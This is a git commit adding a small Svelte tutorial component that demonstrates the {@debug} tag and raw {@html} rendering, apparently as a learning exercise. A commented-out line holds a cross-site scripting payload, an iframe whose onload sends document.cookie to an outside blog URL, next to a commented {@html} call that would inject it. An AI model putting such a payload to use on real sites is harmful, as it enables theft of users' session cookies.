d687801408b2c434ec62fd65a4c232ad6480806c
youyoung00 <you889@hanmail.net>
2022-09-17 15:00:19 +0900

    HTML 데이터 디버깅

---
+++ HTML_data_debug/src/App.svelte
@@ -0,0 +1,12 @@
+<script>
+	// let h1 = '<h1>Hello SHIN</h1>'
+	// let xss = '<iframe onload="document.location=`https://heropy.blog?${document.cookie}`"></iframe>'
+	let name = "heropy"
+	let index = 0
+</script>
+
+{@debug index, name}
+<h1 on:click={() => {index += 1}}>Hello {name}!</h1>
+
+<!-- {@html h1}
+{@html xss} -->
